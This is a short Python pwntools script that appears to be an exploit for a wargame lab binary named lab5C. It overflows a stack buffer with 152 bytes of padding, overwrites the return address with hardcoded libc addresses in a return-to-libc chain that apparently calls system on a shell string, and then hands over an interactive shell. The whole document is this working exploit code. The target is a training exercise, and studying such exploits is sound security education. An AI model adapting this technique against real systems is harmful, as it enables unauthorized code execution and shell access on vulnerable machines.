from pwn import *

r = process(["/tmp/transcen/r.sh", "/levels/lab05/lab5C"])

r.sendline("A" * 152 + "BBBB" + p32(0xb7e63190) + "CCCC" + p32(0xb7f83a24))
r.interactive()
